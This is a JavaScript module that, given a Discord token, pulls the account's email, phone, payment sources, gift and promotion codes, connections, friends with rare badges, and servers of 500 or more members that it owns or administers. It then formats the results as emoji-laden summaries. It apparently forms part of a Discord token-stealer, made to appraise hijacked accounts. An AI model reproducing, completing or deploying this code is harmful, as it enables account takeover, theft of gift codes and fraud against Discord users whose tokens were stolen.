const axios = require("axios");

const request = async (endpoint, token) => {
    try {
        const res = await axios.get(`${[
            'https://discordapp.com/api',
            'https://discord.com/api',
            'https://canary.discord.com/api',
            'https://ptb.discord.com/api'
        ][Math.floor(Math.random() * 4)]}` + endpoint, {
            headers: {
                authorization: token,
            },
        });
        return res.status === 200 ? res.data : "Invalid";
    } catch {
        return "Invalid";
    }
};

const get_badges = (flags) => {
    let user = [
        "<:_:1090015968618623129> ",
        "<:_:918207395279273985> ",
        "<:_:898186057588277259> ",
        "<:_:874750808426692658> ",
        "<:_:874750808388952075> ",
        "<:_:874750808338608199> ",
        "<:_:874750808267292683> ",
        "<:_:944071770506416198> ",
        "<:_:874750808430874664> ",
        "<:_:1042545590640324608> ",
        "<:_:898181029737680896> ",
    ];
    return (
        (1 & flags ? user[0] : "") +
        (2 & flags ? user[1] : "") +
        (4 & flags ? user[2] : "") +
        (8 & flags ? user[3] : "") +
        (64 & flags ? user[4] : "") +
        (128 & flags ? user[5] : "") +
        (256 & flags ? user[6] : "") +
        (512 & flags ? user[7] : "") +
        (16384 & flags ? user[8] : "") +
        (4194304 & flags ? user[9] : "") +
        (131072 & flags ? user[10] : "") || ":x:"
    );
};

const get_guilds = async (token) => {
    try {
        let res = await request("/v9/users/@me/guilds?with_counts=true", token);
        let guilds = res
            .filter((guild) => guild.owner || (guild.permissions & 8) === 8)
            .filter((guild) => guild.approximate_member_count >= 500)
            .map((guild) => ({
                name: guild.name,
                id: guild.id,
                owner: guild.owner,
                member_count: guild.approximate_member_count,
                member_online: guild.approximate_presence_count,
                avatar: guild.icon,
            }));
        return guilds.length
            ? guilds.map((guild) => `${guild.owner
                ? "**👑 Owner**"
                : "**🛠️ Admin**"
                } | Server Name: (${guild.name}) | Members: \`${guild.member_count}\` - Online(s): \`${guild.member_online}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${guild.id}/${guild.avatar}.png?size=2048)`
            ).join("\n")
            : "Not Found";
    } catch (e) {
        return "";
    }
};

const rare_friend_badges = (flags) => {
    let user = [
        "<:_:1090015968618623129> ",
        "<:_:918207395279273985> ",
        "<:_:898186057588277259> ",
        "<:_:874750808426692658> ",
        "<:_:874750808388952075> ",
        "<:_:874750808338608199> ",
        "<:_:874750808267292683> ",
        "<:_:944071770506416198> ",
        "<:_:874750808430874664> ",
        "<:_:1042545590640324608> ",
        "<:_:898181029737680896> ",
    ];
    return (
        (1 & flags ? user[0] : "") +
        (2 & flags ? user[1] : "") +
        (4 & flags ? user[2] : "") +
        (8 & flags ? user[3] : "") +
        (512 & flags ? user[7] : "") +
        (16384 & flags ? user[8] : "") +
        (4194304 & flags ? user[9] : "") +
        (131072 & flags ? user[10] : "") || "Not Found"
    );
};

const get_friends = async (token) => {
    let ñ = "";
    let res = await request("/v9/users/@me/relationships", token);
    res.filter((_) => _.type === 1).forEach((n) => {
        const l = rare_friend_badges(n.user.public_flags);
        ñ += l !== "Not Found"
            ? `${l} ${n.user.username}#${n.user.discriminator}\n`
            : "";
    });
    return ñ || "Not Found";
};

const get_language = (i) => {
    let langs = {
        "zh-TW": "🇨🇳 Chinese-Taiwanese",
        "pr-BR": "🇵🇹 Portuguese",
        "sv-SE": "🇸🇪 Swedish",
        "zh-CN": "🇨🇳 Chinese-China",
        "en-GB": "🪟 English (UK)",
        "en-US": "🇺🇸 USA",
        "es-ES": "🇪🇸 Español",
        ro: "🇷🇴 Romanian",
        fi: "🇫🇮 Finnish",
        vi: "🇻🇳 Vietnamese",
        tr: "🇹🇷 Turkish",
        ru: "🇷🇺 Russian",
        uk: "🇺🇦 Ukrainian",
        hi: "🇮🇳 Indian",
        th: "🇹🇼 Taiwanese",
        hr: "🇭🇷 Croatian",
        it: "🇮🇹 Italianio",
        lt: "🇱🇹 Lithuanian",
        no: "🇳🇴 Norwegian",
        ja: "🇯🇵 Japanese",
        ko: "🇰🇷 Korean",
        fr: "🇫🇷 French",
        da: "🇩🇰 Dansk",
        de: "🇩🇪 Deutsch",
        pl: "🇵🇱 Polish",
        cs: "🇨🇿 Czech",
        el: "🇬🇷 Greek",
        bg: "🇧🇬 Bulgarian",
        hu: "🇳🇴🇭🇺 Hungarian",
    };
    return langs[i] || "Unknown Language";
};

const get_date = (a, b) => new Date(a).setMonth(a.getMonth() + b);

const get_nitro_premium = (res) => {
    let boost = [
        "<:_:1087043238654906472> ",
        "<:_:1087043319227494460> ",
        "<:_:1087043368250511512> ",
        "<:_:1087043493236592820> ",
        "<:_:1087043493236592820> ",
        "<:_:1162420359291732038> ",
        "<:_:1051453775832961034> ",
        "<:_:1051453778127237180> ",
        "<:_:1051453776889917530> ",
    ];
    let { premium_type, premium_guild_since } = res,
        x = "<:_:880364932984627231>";
    switch (premium_type) {
        default:
            return ":x:";
        case 1:
            return x;
        case 2:
            if (!premium_guild_since) return x;
            const now = new Date();
            const m = [2, 3, 6, 9, 12, 15, 18, 24];
            let rem = 0;
            for (let i = 0; i < m.length; i++) {
                const d = m[i];
                if (
                    Math.round(
                        (get_date(new Date(premium_guild_since), d) - now) / 86400000,
                    ) > 0
                ) {
                    rem = i;
                    break;
                }
            }
            return `${x} ${boost[rem]}`;
    }
};

const get_image = async (url) => !url
    ? false
    : `${url}.${(await axios.head(url)).headers["content-type"].includes("image/gif") ? "gif" : "png"}?size=512`;

const get_gifts_codes = async (token, settings) => {
    let t = [],
        res = await request(`/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`, token);
    return res.length === 0
        ? "Codes-Gifts Not Found"
        : res.forEach((g) => t.push({
            name: g.promotion.outbound_title,
            code: g.code
        }));
};

const get_theme = (t) => {
    var themes = {
        dark: "Dark",
        light: "Light"
    };
    return themes[t] || "Unknown Theme";
};

const get_status_emoji = (s) => {
    var status = {
        online: "<:_:1129709364316491787>",
        idle: "<:_:1120542710424674306>",
        dnd: "<:_:974692691289993216>",
        invisible: "<:_:1137141023529762916>",
    };
    return status[s];
};

const get_discord_Info = async (token) => {
    try {
        let me = await request(`/v9/users/@me`, token);
        if (me === "Invalid") return;
        let billing,
            settings = await request("/v9/users/@me/settings", token),
            relationships = await request("/v9/users/@me/relationships", token),
            guilds = await request("/v9/users/@me/guilds?with_counts=true", token),
            applications = await request("/v9/applications", token),
            connections = await request("/v9/users/@me/connections", token),
            gifts = await request("/v8/users/@me/entitlements/gifts", token);
            
            billing = await request("/v9/users/@me/billing/payment-sources", token);
            billing = billing?.reduce((a, e) => {
                if (e.brand && !e.invalid) a += "<a:_:1083014677430284358> ";
                if (e.email) a += "<:_:1129073151746252870> ";
                return a;
            }, '') || 'Billing not found';
            
        return {
            token: token,
            ID: me.id,
            globalName: `${me.global_name}`,
            avatarDecoration: `${me.avatar_decoration_data ? me.avatar_decoration_data : "Avatar decoration not found"}`,
            username: `${me.username}#${me.discriminator}`,
            badges: get_badges(me.flags),
            nitroType: get_nitro_premium(await request(`/v9/users/${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, token)),
            avatar: me.avatar ? await get_image(`https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}`) : "Avatar not found",
            banner: me.banner ? await get_image(`https://cdn.discordapp.com/banners/${me.id}/${me.banner}`) : "Banner not found",
            totalFriend: Array.isArray(relationships) ? relationships.filter((b) => b.type === 1).length : "No Found",
            totalBlocked: Array.isArray(relationships) ? relationships.filter((a) => a.type === 2).length : "No Found",
            pending: Array.isArray(relationships) ? relationships.filter((r) => r.type === 3).length : "No Found",
            NitroGifts: gifts[0] ? gifts.map((g) => `${g}, `).join("") : "Nitro Gifts not found",
            totalOwnedGuild: Array.isArray(guilds) ? guilds.filter((g) => g.owner).length : "No Found",
            totalApplication: applications.length,
            totalConnection: connections.length,
            totalGuild: guilds.length,
            NSFW: me.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
            MFA2: me.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
            verified: me.verified ? "✅" : "❌",
            bio: me.bio || "Bio not found",
            phone: me.phone || "Phone not found",
            mail: me.email,
            billing,
            langue: get_language(settings.locale),
            status: get_status_emoji(settings.status),
            theme: get_theme(settings.theme),
            gifts: get_gifts_codes(token, settings),
            rare: {
                guilds: await get_guilds(token),
                friends: await get_friends(token),
            },
        };
    } catch (e) {
        console.log(e)
        return e
    }
};

module.exports = { 
    get_discord_Info 
};
